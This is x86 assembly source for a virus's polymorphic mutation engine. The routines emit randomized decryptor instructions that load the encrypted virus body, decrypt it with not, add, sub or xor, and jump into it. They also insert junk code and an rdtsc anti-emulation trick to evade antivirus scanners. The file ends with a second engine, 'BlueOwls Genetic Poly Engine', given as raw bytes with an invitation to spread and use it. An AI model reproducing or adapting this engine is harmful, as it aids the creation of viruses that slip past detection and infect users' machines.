	call	WriteJunkCode
	call	WriteInstruction3
	call	WriteJunkCode
	call	WriteInstruction4
	call	WriteJunkCode
	mov	dword ptr [ebp + PolyBuffer],edi	;saved for loop
	call	WriteInstruction5
	call	WriteJunkCode
	call	WriteInstruction6
	call	WriteJunkCode
	call	WriteInstruction7
	call	WriteJunkCode
	call	WriteInstruction8
	call	WriteJunkCode
	call	WriteInstruction9
	call	WriteJunkCode
	ret
	
	EncryptionMethod	db	0	;1=not 2=add 3=sub 4=xor
	key			dd	0
	WhereToWriteDecryptor	dd	0
	StartOfDataToEncrypt	dd	0
	ProgramImageBase	dd	0
	PolyBuffer		dd	0
	SizeOfDataToEncrypt	dd	0	;virus size in dwords
	FixRVA			dd	0

	CustomXDecryptPoint	dd	0
	
	


	

		
WriteInstruction2:
	;this function set esi register to start of encrypted virus
	call	GenRandomNumber
	mov	ebx,[ebp + CustomXDecryptPoint]
	and	eax,0ffh		;get random number between 0 ~ 255
	cmp	eax,33h
	ja	ins2_1
	mov	byte ptr [edi],0beh	;way 1:
	mov	dword ptr [edi + 1],ebx	;mov esi,StartOfDataToEncrypt
	add	edi,5h
	jmp	retins2
ins2_1:	cmp	eax,66h
	ja	ins2_2
	mov	byte ptr [edi],68h	;way 2:
	mov	dword ptr [edi + 1],ebx	;push	StartOfDataToEncrypt
	add	edi,5h
	call	WriteJunkCode		;pop	esi
	mov	byte ptr [edi],5eh
	inc	edi
	jmp	retins2
ins2_2:	cmp	eax,99h
	ja	ins2_3
	mov	word ptr [edi],0f633h	;way 3:
	add	edi,2h			;xor esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival
	jmp	retins2
ins2_3:	cmp	eax,0cch
	ja	ins2_4
	mov	word ptr [edi],0f62bh	;way 4
	add	edi,2h			;sub esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival		
	jmp	retins2
ins2_4:	not	ebx			;way 5
	mov	byte ptr [edi],0beh	;mov esi,not StartOfDataToEncrypt
	mov	dword ptr [edi + 1],ebx	
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d6f7h	;not esi
	add	edi,2h
retins2:ret
_ins2oresival:
	;write or esi,StartOfDataToEncrypt instruction
	mov	word ptr [edi],0ce81h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
	
WriteInstruction3:
	;this function set edi register to esi register
	call	GenRandomNumber
	and	eax,0c8h
	cmp	eax,32h
	ja	ins3_1
	mov	word ptr [edi],0fe8bh	;mov edi,esi
	add	edi,2h
	jmp	retins3
ins3_1: cmp	eax,64h
	ja	ins3_2
	mov	byte ptr [edi],56h	;push esi
	inc	edi
	call	WriteJunkCode
	mov	byte ptr [edi],5fh	;pop edi
	inc	edi
	jmp	retins3
ins3_2:	cmp	eax,96h
	ja	ins3_3
	mov	word ptr [edi],0fe87h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
	jmp	retins3
ins3_3:	mov	word ptr [edi],0f787h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
retins3:ret

WriteInstruction4:
	;this function set ecx with the size of the virus in dwords
	call	GenRandomNumber
	mov	ebx,[ebp + SizeOfDataToEncrypt]
	and	eax,0ffh
	cmp	eax,33h
	ja	ins4_1
	mov	byte ptr [edi],0b9h	;mov ecx,sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins4	
ins4_1:	cmp	eax,66h
	ja	ins4_2
	mov	byte ptr [edi],68h	;push sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	byte ptr [edi],59h	;pop ecx
	inc	edi
	jmp	retins4	
ins4_2:	cmp	eax,99h
	ja	ins4_3
	mov	word ptr [edi],0c933h	;xor ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4	
ins4_3:	cmp	eax,0cch
	ja	ins4_4
	mov	word ptr [edi],0c92bh	;sub ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4
ins4_4: not	ebx
	mov	byte ptr [edi],0b9h	;mov ecx,not sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d1f7h
	add	edi,2h
retins4:ret
_ins4orecxval:
	mov	word ptr [edi],0c981h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
WriteInstruction5:
	;this function read 4 bytes from [esi] into eax
	;and add to esi register 4 (if there is need to do so).
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,64h
	ja	ins5_1
	mov	byte ptr [edi],0adh	;lodsd
	inc	edi
	jmp	retins5
ins5_1:	cmp	eax,0c8h
	ja	ins5_2
	mov	word ptr [edi],068bh	;mov eax,dword ptr [esi]
	add	edi,2h
	call	_ins5addesi4
	jmp	retins5
ins5_2:	mov	word ptr [edi],36ffh	;push dword ptr [esi]
	add	edi,2h
	call	WriteJunkCode
	mov	byte ptr [edi],58h	;pop eax
	inc	edi
	call	_ins5addesi4
retins5:ret

_ins5addesi4:
	;this function write add to esi register 4
	call	GenRandomNumber
	and	eax,64h
	cmp	eax,32h
	ja	addesi4_2
	mov	word ptr [edi],0c683h	;way 1
	mov	byte ptr [edi + 2],4h	;add esi,4h
	add	edi,3h
	jmp	raddesi
addesi4_2:
	mov	ecx,4h		;way 2
@incesi:mov	byte ptr [edi],46h
	inc	edi
	call	WriteJunkCode
	loop	@incesi
raddesi:ret


WriteInstruction6:
	;this function decrypt the value of eax
	mov	ebx,dword ptr [ebp + key]
	cmp	byte ptr [ebp + EncryptionMethod],1h
	jne	ins6_1
	mov	word ptr [edi],0d0f7h	;not eax
	add	edi,2h
	jmp	retins6
ins6_1:	cmp	byte ptr [ebp + EncryptionMethod],2h
	jne	ins6_2
	mov	byte ptr [edi],2dh	;sub eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_2:	cmp	byte ptr [ebp + EncryptionMethod],3h
	jne	ins6_3
	mov	byte ptr [edi],05h	;add eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_3:	mov	byte ptr [edi],35h
	mov	dword ptr [edi + 1],ebx ;xor eax,key
	add	edi,5h
	jmp	retins6
retins6:ret




WriteInstruction7:
	;this function copy the value of eax to [edi]
	call	GenRandomNumber
	and	eax,258h
	cmp	eax,0c8h
	ja	ins7_1
	mov	byte ptr [edi],0abh	;stosd
	inc	edi
	jmp	retins7
ins7_1:	cmp	eax,190h
	ja	ins7_2
	mov	word ptr [edi],0789h	;mov dword ptr [edi],eax
	add	edi,2h
	call	WriteJunkCode
	call	addedi4
	jmp	retins7
ins7_2:	mov	byte ptr [edi],50h	;push eax
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],078fh	;pop dword ptr [edi]
	add	edi,2h
	call	addedi4
retins7:ret

addedi4:
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	_addedi4
	mov	word ptr [edi],0c783h
	mov	byte ptr [edi + 2],4h
	add	edi,3h
	jmp	retins7a
_addedi4:
	mov	ecx,4h
@incedi:mov	byte ptr [edi],47h	;inc edi
	inc	edi
	call	WriteJunkCode
	loop	@incedi
retins7a:ret


WriteInstruction8:
	;this function write the loop instruction of the decryptor
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	ins8_1
	mov	byte ptr [edi],49h	;dec ecx
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],0f983h
	mov	byte ptr [edi + 2],0h	;cmp ecx,0h
	add	edi,3h
	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],75h	;jne
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
	jmp	retins8
ins8_1:	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],0e2h	;loop
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
retins8:ret


WriteInstruction9:
	;this istruction write a code in the stack,that jump into virus code
	call	GenRandomNumber
	mov	ebx,[ebp + CustomXDecryptPoint]
	mov	dword ptr [ebp + push_and_ret + 1],ebx	;save address
	;push 'push offset' & 'ret' instructions to the stack
	;way 1:
	;	push xxx
	;	push xxx
	;way 2:
	;	mov	reg,xxx
	;	push	reg
	;	mov	reg,xxx
	;	push	reg
	;way 3:
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;------------------------------------------------------
	and	eax,4b0h
	cmp	eax,190h
	ja	I9_A
	xor	ecx,ecx				;way 1 !!!
	mov	cx,word ptr [ebp + push_and_ret+4]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi + 1h],ecx	;gen push xxx
	add	edi,5h
	call	WriteJunkCode
	xor	ecx,ecx
	mov	ecx,dword ptr [ebp + push_and_ret]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi +1h],ecx		;gen push xxx
	add	edi,5h	
	jmp	I9_Exit
I9_A:	cmp	eax,320h
	ja	I9_B
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	call	GenMoveAndPush
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	call	GenMoveAndPush
	jmp	I9_Exit
I9_B:	call	GenRandomNumber
	xchg	ebx,eax
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	xor	eax,ebx
	call	GenMoveAndPush
	call	_WriteJunkCode
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	push	eax
	stosd
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	xor	eax,dword ptr [esp]
	call	GenMoveAndPush
	call	_WriteJunkCode
	pop	ebx
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	stosd
I9_Exit:
	Call	WriteJunkCode
	

	call	GenRandomNumber
	
	and	eax,1000h			;get num between 0 ~ 4k
	cmp	eax,400h
	ja	@GJE1

	
	call	GenRandomNumber
	
	push	eax				;save rnd in stack
	
	
	call	GenMovRegEsp

	
	xchg	eax,ecx
	mov	ecx,8h
	div	ecx
	xchg	eax,ecx
	
	mov	eax,[esp]

	call	CGenSubRegNum

	
	sub	cl,0e9h
	add	cl,51h
	xchg	cl,al
	stosb					;gen push reg
	
	;gen add dword ptr [esp],num
		
	mov	al,81h				;gen add
	stosb
	mov	ax,2404h			;dword ptr [esp]
	stosw
	pop	eax				;restore rnd number
	stosd
	mov	al,0c3h				;gen ret
	stosb

	jmp	ExtGJE
@GJE1:	cmp	eax,800h
	ja	@GJE2
		
		
	call	GenMovRegEsp

	xchg	eax,ecx
	mov	ecx,8h
	div	ecx

	add 	al,51h				;gen push reg
	stosb
	
	mov	al,0c3h				;gen ret
	stosb
	
	jmp	ExtGJE
@GJE2:	cmp	eax,0c00h
	ja	@GJE3
	mov	ax,0c354h			;gen push esp & ret
	stosw
	jmp	ExtGJE	
@GJE3:	mov	ax,0e4ffh			;gen jmp esp
	stosw
ExtGJE:	ret


	;instructions to generate in the stack:
	push_and_ret	db	68h,0,0,0,0,0c3h
	
GenXAntiEmulation:

	mov	al,50h
	stosb					;gen push eax
	
	call	_WriteJunkCode
	
	mov	ax,310Fh
	stosw					;gen rdtsc
		
	call	GenRandomNumber
	cmp	al,0a0h				;use rcl or rcr ?
	ja	GnRclx
	
	mov	ax,0d8c1h			;rcr
	jmp	xGnXX
GnRclx: mov	ax,0d0c1h			;rcl
xGnXX:	stosw
	
	call	GenRandomNumber
	stosb
	
	call	GenRandomNumber
	
	cmp	al,0a0h
	ja	GnxJc
	mov	ax,0f973h
	jmp	Xjmp2
GnxJc:	mov	ax,0f972h
Xjmp2:	stosw					;gen jc or jnc to exit procedure code
	
	call	_WriteJunkCode
	
	mov	al,58h				;gen pop eax
	stosb

	ret

			
;input:
;edi - dest
;cl  - reg index(0 ~ 6)
;eax - number ( if custom is used)
GenSubRegNum:
	call	GenRandomNumber
CGenSubRegNum:				;use custom number
	add	cl,0e9h
	cmp	cl,0ech
	jne	@gsrn
	mov	cl,0efh
@gsrn:	push	eax
	mov	ah,cl
	mov	al,81h
	stosw
	pop	eax
	stosd
	ret		
	
	
_WriteJunkCode:		;gen junk code that dont destroy registers
	call	GenRandomNumber
	and	eax,5208h
	cmp	eax,0bb8h
	ja	_WJC1
	call	GenAndReg
	jmp	ExitJC
_WJC1:	cmp	eax,1770h
	ja	_WJC2
	call	GenJump
	jmp	ExitJC
_WJC2:	cmp	eax,2328h
	ja	_WJC3
	call	GenPushPop
	jmp	ExitJC
_WJC3:	cmp	eax,2ee0h
	ja	_WJC4
	call	GenIncDec
	jmp	ExitJC
_WJC4:	cmp	eax,3a98h
	ja	_WJC5
	call	GenMoveRegReg
	jmp	ExitJC
_WJC5:	call	OneByte
ExitJC:	ret

;output cl:reg id
GenMovRegEsp:
	call	GenRandomNumber
	and	eax,00000600h
	mov	ecx,8h
	mul	ecx
	mov	cl,ah
	add	ah,0cch
	mov	al,8bh
	stosw
	ret	

;output ch:reg id
GenEmptyReg:
	call	GenRandomNumber
	xor	ecx,ecx
	and	eax,5208h	
	cmp	eax,0bb8h
	ja	_ER
	mov	ch,0c0h
	jmp	_ER_
_ER:	cmp	eax,1770h
	ja	_ER2
	mov	ch,0dbh
	jmp	_ER_
_ER2:	cmp	eax,2328h
	ja	_ER3
	mov	ch,0c9h
	jmp	_ER_
_ER3:	cmp	eax,2ee0h
	ja	_ER4
	mov	ch,0d2h
	jmp	_ER_
_ER4:	cmp	eax,3a98h
	ja	_ER5
	mov	ch,0ffh
	jmp	_ER_
_ER5:	mov	ch,0f6h
_ER_:	call	GenRandomNumber
	cmp	ah,80h
	ja	_ER__
	mov	cl,33h
	jmp	_E_R
_ER__:	mov	cl,2bh
_E_R:	mov	ax,cx
	stosw	
	ret
	

GenMoveAndPush:
	push	eax				;number to mov & push
No_Esp:	call	GenRandomNumber
	and	al,7h
	mov	cl,al
	add	al,0b8h
	cmp	al,0bch
	je	No_Esp
	stosb
	pop	eax
	stosd
	push	ecx
	call	_WriteJunkCode			;gen junk between the mov and the push
	pop	eax
	add	al,50h
	stosb
	ret
		
InitRandomNumber:
	call	[ebp + GetTickCount]
	xor	eax,[ebp + RandomNumber]
	mov	[ebp + RandomNumber],eax
	ret
	RandomNumber	dd	0
GenRandomNumber:				;a simple random num generator
	pushad
	mov	eax,dword ptr [ebp + RandomNumber]
	and	eax,12345678h
	mov	cl,ah
	ror	eax,cl
	add	eax,98765abdh
	mov	ecx,12345678h
	mul	ecx
	add	eax,edx
	xchg	ah,al
	sub	eax,edx
	mov	dword ptr [ebp + RandomNumber],eax
	popad
	mov	eax,dword ptr [ebp + RandomNumber]
	ret

WriteJunkCode:
	call	GenRandomNumber			;split this procedure
	and	eax,3e8h			;to four procedure's
	cmp	eax,0fah			;in order to give each
	ja	_jnk1				;junkcode the same chance
	call	WriteJunkCode1
	jmp	ExitJunk
_jnk1:	cmp	eax,1f4h
	ja	_jnk2
	call	WriteJunkCode2
	jmp	ExitJunk
_jnk2:	cmp	eax,2eeh
	ja	_jnk3
	call	WriteJunkCode3
	jmp	ExitJunk
_jnk3:	call	WriteJunkCode4
ExitJunk:ret




WriteJunkCode1:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jnk_1
	call	GenAndReg	;1
	jmp	ExtJunk1
_jnk_1:	cmp	eax,1f4h
	ja	_jnk_2
	call	GenJump		;2
	jmp	ExtJunk1
_jnk_2:	cmp	eax,2eeh
	ja	_jnk_3
	call	GenPushPop	;3
	jmp	ExtJunk1
_jnk_3:	call	GenIncDec	;4
ExtJunk1:ret
	
	
WriteJunkCode2:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jn_k1
	call	GenMoveRegReg	;5
	jmp	ExtJunk2
_jn_k1:	cmp	eax,1f4h
	ja	_jn_k2
	call	GenAnd		;6
	jmp	ExtJunk2
_jn_k2:	cmp	eax,2eeh
	ja	_jn_k3
	call	GenMove		;7
	jmp	ExtJunk2
_jn_k3:	call	GenPushTrashPopReg	;8
ExtJunk2:ret
	
	
WriteJunkCode3:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_j_nk1
	call	GenShrReg	;9
	jmp	ExtJunk3
_j_nk1:	cmp	eax,1f4h
	ja	_j_nk2
	call	GenShlReg	;10
	jmp	ExtJunk3
_j_nk2:	cmp	eax,2eeh
	ja	_j_nk3
	call	GenRorReg	;11
	jmp	ExtJunk3
_j_nk3:	call	GenRolReg	;12
ExtJunk3:ret
	
	
WriteJunkCode4:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	__jnk1
	call	GenOrReg	;13
	jmp	ExtJunk4
__jnk1:	cmp	eax,1f4h
	ja	__jnk2
	call	GenXorReg	;14
	jmp	ExtJunk4
__jnk2:	cmp	eax,2eeh
	ja	__jnk3
	call	GenSubAddTrash	;15
	jmp	ExtJunk4
__jnk3:	call	GenXAntiEmulation;16
ExtJunk4:ret




GenAndReg:
	;this function generate and reg,reg instruction
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	and2
	mov	ah,0c0h
	jmp	exitand
and2:	cmp	eax,7d0h
	ja	and3
	mov	ah,0dbh
	jmp	exitand
and3:	cmp	eax,0bb8h
	ja	and4
	mov	ah,0c9h
	jmp	exitand
and4:	cmp	eax,0fa0h
	ja	and5
	mov	ah,0d2h
	jmp	exitand
and5:	cmp	eax,1388
	ja	and6
	mov	ah,0ffh
	jmp	exitand
and6:	cmp	eax,1770h
	ja	and7
	mov	ah,0f6h
	jmp	exitand
and7:	cmp	eax,1b58h
	ja	and8
	mov	ah,0edh
	jmp	exitand
and8:	mov	ah,0e4h
exitand:mov	al,23h
	stosw
	ret

GenJump:
	;this function generate do nothing condition jump
	call	GenRandomNumber
	and	eax,0fh
	add	eax,70h
	stosw
	ret

GenPushPop:
	;this function generate push reg \ pop reg instruction
	call	GenRandomNumber
	and	eax,7h
	add	eax,50h
	stosb
	add	eax,8h
	stosb
	ret

GenIncDec:
	;this function generate:inc reg\dec reg or dec reg\inc reg instruction
	call	GenRandomNumber
	cmp	al,7fh
	ja	decinc
	and	eax,7h
	add	eax,40h
	stosb
	add	eax,8h
	stosb
	jmp	exitincd
decinc:	and	eax,7h
	add	eax,48h
	mov	byte ptr [edi],al
	stosb
	sub	eax,8h
	mov	byte ptr [edi],al
	stosb
exitincd:ret


GenMoveRegReg:			;gen mov reg,reg
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	mreg2
	mov	ah,0c0h
	jmp	exitmreg
mreg2:	cmp	eax,7d0h
	ja	mreg3
	mov	ah,0dbh
	jmp	exitmreg
mreg3:	cmp	eax,0bb8h
	ja	mreg4
	mov	ah,0c9h
	jmp	exitmreg
mreg4:	cmp	eax,0fa0h
	ja	mreg5
	mov	ah,0d2h
	jmp	exitmreg
mreg5:	cmp	eax,1388
	ja	mreg6
	mov	ah,0ffh
	jmp	exitmreg
mreg6:	cmp	eax,1770h
	ja	mreg7
	mov	ah,0f6h
	jmp	exitmreg
mreg7:	cmp	eax,1b58h
	ja	mreg8
	mov	ah,0edh
	jmp	exitmreg
mreg8:	mov	ah,0e4h
exitmreg:
	mov	al,8bh
	stosw
	ret
	
GenAnd:
	;this function generate and ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nand1
	mov	ah,0e3h
	jmp	wand
nand1:	cmp	al,0a0h
	ja	nand2
	mov	ah,0e2h
	jmp	wand
nand2:	mov	ah,0e5h
wand:	mov	al,81h
	stosw
	pop	eax
	stosd
	ret
	
GenMove:
	;this function generate mov ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nmov1
	mov	al,0bbh
	jmp	wmov
nmov1:	cmp	al,0a0h
	ja	nmov2
	mov	al,0bah
	jmp	wmov
nmov2:	mov	al,0bdh
wmov:	stosb
	pop	eax
	stosd
	ret

GenPushTrashPopReg:
	;this function generate push trash\ pop ebp\ebx\edx instruction
	call	GenRandomNumber
	mov	byte ptr [edi],68h
	inc	edi
	stosd
	cmp	al,55h
	ja	nextpt
	mov	byte ptr [edi],5dh
	jmp	wpop
nextpt:	cmp	al,0aah
	ja	nextpt2
	mov	byte ptr [edi],5ah
	jmp	wpop
nextpt2:mov	byte ptr [edi],5bh
wpop:	inc	edi
	ret	
	
GenShrReg:				;gen shr unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshr
	mov	byte ptr [edi],0edh
	jmp	wshr
nshr:	cmp	al,0a0h
	ja	nshr2
	mov	byte ptr [edi],0eah
	jmp	wshr
nshr2:	mov	byte ptr [edi],0ebh
wshr:	inc	edi
	stosb
	ret
	
GenShlReg:				;gen shl unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshl
	mov	byte ptr [edi],0e3h
	jmp	wshl
nshl:	cmp	al,0a0h
	ja	nshl2
	mov	byte ptr [edi],0e2h
	jmp	wshl
nshl2:	mov	byte ptr [edi],0e5h
wshl:	inc	edi
	stosb
	ret
	
GenRorReg:				;gen ror unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nror
	mov	byte ptr [edi],0cbh
	jmp	wror
nror:	cmp	al,0a0h
	ja	nror2
	mov	byte ptr [edi],0cah
	jmp	wror
nror2:	mov	byte ptr [edi],0cdh
wror:	inc	edi
	stosb
	ret
	
	
GenRolReg:				;gen rol unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nrol
	mov	byte ptr [edi],0c3h
	jmp	wrol
nrol:	cmp	al,0a0h
	ja	nrol2
	mov	byte ptr [edi],0c2h
	jmp	wrol
nrol2:	mov	byte ptr [edi],0c5h
wrol:	inc	edi
	stosb
	ret
	
GenOrReg:				;gen or unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nor
	mov	ah,0cbh
	jmp	wor
nor:	cmp	ah,0a0h
	ja	nor2
	mov	ah,0cah
	jmp	wor
nor2:	mov	ah,0cdh
wor:	stosw
	pop	eax
	stosd
	ret

GenXorReg:				;gen xor unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nXor
	mov	ah,0f3h
	jmp	wXor
nXor:	cmp	ah,0a0h
	ja	nXor2
	mov	ah,0f2h
	jmp	wXor
nXor2:	mov	ah,0f5h
wXor:	stosw
	pop	eax
	stosd
	ret


GenSubAddTrash:				;gen add reg,num\sub reg,num
noesp:	call	GenRandomNumber
	mov	ebx,eax
	cmp	al,80h
	ja	sub_f
	and	ah,7h
	add	ah,0c0h
	cmp	ah,0c4h
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0e8h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	jmp	exitsa
sub_f:	and	ah,7h
	add	ah,0e8h
	cmp	ah,0ech
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0c0h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
exitsa:	ret

OneByte:				;gen one byte do nothing instruction
	call	GenRandomNumber
	cmp	al,32h
	ja	byte1
	mov	al,90h
	jmp	end_get_byte
byte1:	cmp	al,64h
	ja	byte2
	mov	al,0f8h
	jmp	end_get_byte
byte2:	cmp	al,96h
	ja	byte3
	mov	al,0f5h
	jmp	end_get_byte
byte3:	cmp	al,0c8h
	ja	byte4
	mov	al,0f9h
	jmp	end_get_byte
byte4:	mov	al,0fch
end_get_byte:
	stosb
	ret	

        ; BGPE  - BlueOwls Genetic Poly Engine (Simple version, v0), november 2004

	; Al though this is just a "simple" version, feel free to spread and
	; use it in whatever you like, as long as you don't hold me responsible
	; AND don't claim it is yours. :) What i was thinking about adding was
	; placing all the code blocks in random order, maybe something for a
	; next version ;). I have not tested it thouroughly, so it could have
	; bugs causing it not to function properly or not to function at all. I
	; just hope it does not have bugs :).

	; Good luck with it.
	; BlueOwl


                ; in:   eax = random number
                ;       ecx = size of virus in bytes rounded to a dword ((virus_size+3)/4)*4
                ;       esi = start of virus
                ;       edi = start of outputbuffer
                ;
                ; out:  eax = size of generated

		; size of bgpe: 646 bytes

bgpe:           db      060h,0E8h,000h,000h,000h,000h,05Dh,0FFh,075h,062h
                db      0FFh,0B5h,07Ch,001h,000h,000h,0FFh,0B5h,080h,001h
                db      000h,000h,055h,051h,08Dh,08Dh,07Ch,001h,000h,000h
                db      08Dh,05Dh,062h,089h,0E5h,083h,0C5h,004h,0E8h,049h
                db      002h,000h,000h,092h,0E8h,043h,002h,000h,000h,021h
                db      0C2h,0E8h,03Ch,002h,000h,000h,021h,0C2h,0E8h,035h
                db      002h,000h,000h,021h,0C2h,031h,013h,06Ah,007h,05Ah
                db      087h,0CAh,0E8h,027h,002h,000h,000h,0A9h,007h,000h
                db      000h,000h,075h,005h,08Ah,002h,088h,042h,001h,042h
                db      0E2h,0ECh,059h,0B0h,0E8h,0AAh,089h,0C8h,0ABh,057h
                db      0C1h,0E9h,002h,068h,000h,000h,000h,000h,051h,050h
                db      0F3h,0A5h,0E8h,0FFh,001h,000h,000h,050h,0E8h,001h
                db      001h,000h,000h,005h,006h,058h,006h,050h,005h,08Bh
                db      00Eh,004h,024h,006h,0FFh,034h,024h,006h,058h,009h
                db      00Bh,00Eh,004h,024h,023h,00Eh,004h,024h,004h,016h
                db      0B8h,066h,005h,068h,066h,016h,058h,009h,083h,016h
                db      0E0h,000h,081h,016h,0C0h,066h,005h,08Dh,01Eh,005h
                db      066h,005h,04Eh,087h,02Eh,000h,007h,04Eh,0FFh,006h
                db      030h,026h,058h,005h,04Eh,08Bh,02Eh,000h,008h,04Eh
                db      00Bh,02Eh,000h,023h,02Eh,000h,016h,08Dh,06Eh,080h
                db      056h,0C1h,026h,0C0h,05Eh,076h,051h,00Fh,0B6h,04Dh
                db      0ECh,0D3h,0C8h,059h,02Bh,045h,01Ch,0C3h,014h,0C1h
                db      026h,0C8h,05Eh,0F7h,026h,0D8h,076h,0F7h,0D8h,051h
                db      00Fh,0B6h,04Dh,0ECh,0D3h,0C0h,059h,0C3h,00Fh,00Fh
                db      026h,0C8h,081h,026h,0F0h,056h,076h,033h,045h,01Ch
                db      00Fh,0C8h,0C3h,00Fh,081h,026h,0E8h,056h,0F7h,026h
                db      0D0h,076h,0F7h,0D0h,003h,045h,01Ch,0C3h,004h,087h
                db      02Eh,000h,006h,026h,050h,08Fh,006h,000h,004h,089h
                db      02Eh,000h,007h,021h,02Eh,000h,009h,02Eh,000h,005h
                db      08Dh,036h,040h,004h,005h,083h,006h,0C0h,004h,005h
                db      083h,006h,0E8h,0FCh,009h,006h,040h,006h,040h,006h
                db      040h,006h,040h,003h,016h,048h,005h,083h,016h,0E8h
                db      001h,005h,083h,016h,0C0h,0FFh,005h,08Dh,03Eh,040h
                db      0FFh,008h,009h,03Eh,0C0h,074h,002h,0EBh,046h,007h
                db      016h,040h,016h,048h,075h,046h,007h,083h,016h,0F8h
                db      001h,073h,046h,009h,016h,048h,078h,003h,016h,040h
                db      079h,046h,002h,0C3h,004h,0C2h,000h,000h,004h,058h
                db      0FFh,0E0h,007h,0FFh,034h,024h,0C2h,004h,000h,000h
                db      05Ah,0E8h,007h,000h,000h,000h,000h,001h,002h,003h
                db      005h,006h,007h,05Bh,080h,03Ah,000h,00Fh,084h,0C7h
                db      000h,000h,000h,089h,0D6h,06Ah,004h,059h,00Fh,0B6h
                db      002h,001h,0C2h,0E2h,0F9h,08Bh,04Dh,0F8h,0C1h,06Dh
                db      0F8h,002h,083h,0E1h,003h,009h,0C9h,074h,007h,00Fh
                db      0B6h,006h,001h,0C6h,0E2h,0F9h,00Fh,0B6h,00Eh,049h
                db      046h,0ACh,050h,083h,0E0h,007h,083h,0F8h,006h,058h
                db      074h,009h,008h,0E0h,0AAh,028h,0E4h,0E2h,0EEh,0EBh
                db      0BDh,00Fh,0B6h,0C0h,0C1h,0E8h,003h,052h,0E8h,00Fh
                db      000h,000h,000h,058h,034h,060h,03Ah,047h,04Bh,053h
                db      05Bh,064h,06Ch,070h,07Ch,075h,041h,01Ch,05Ah,08Ah
                db      004h,002h,001h,0C2h,029h,0C0h,0FFh,0D2h,05Ah,0EBh
                db      0D4h,052h,057h,087h,0F2h,08Bh,04Dh,0F4h,08Bh,075h
                db      0FCh,089h,0F7h,0ADh,0FFh,0D2h,0ABh,0E2h,0FAh,06Ah
                db      001h,059h,05Fh,05Ah,0C3h,08Ah,023h,0C0h,0E4h,003h
                db      0C3h,08Ah,063h,001h,0C0h,0E4h,003h,0C3h,08Ah,063h
                db      002h,0C0h,0E4h,003h,00Ah,063h,002h,0C3h,08Ah,063h
                db      002h,0C0h,0E4h,003h,0EBh,005h,08Ah,023h,0C0h,0E4h
                db      003h,00Ah,023h,0C3h,0E8h,0DAh,0FFh,0FFh,0FFh,00Ah
                db      063h,001h,0C3h,08Bh,045h,0F0h,029h,0F8h,048h,0AAh
